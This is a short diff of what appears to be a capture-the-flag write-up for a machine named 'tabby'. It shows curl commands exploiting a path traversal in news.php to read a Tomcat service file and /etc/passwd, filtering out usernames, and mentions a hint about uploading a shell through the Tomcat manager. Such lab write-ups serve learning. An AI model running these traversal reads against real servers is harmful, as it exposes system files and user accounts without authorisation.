@@ -169,7 +169,9 @@ curl tabby/news.php?file=../../../../lib/systemd/system/tomcat9.service > tomcat
 curl http://tabby/news.php?file=../../../../etc/passwd > passwd # at least we will get the usernames.
 egrep -v "bin/nologin|bin/false" passwd
 # we found a new user: ash
+# can't manage to extract any info though.
 ```
+---
 
 Alright, after a couple of hours I've looked up a hint:
 The idea is to upload a shell via the Tomcat manager.
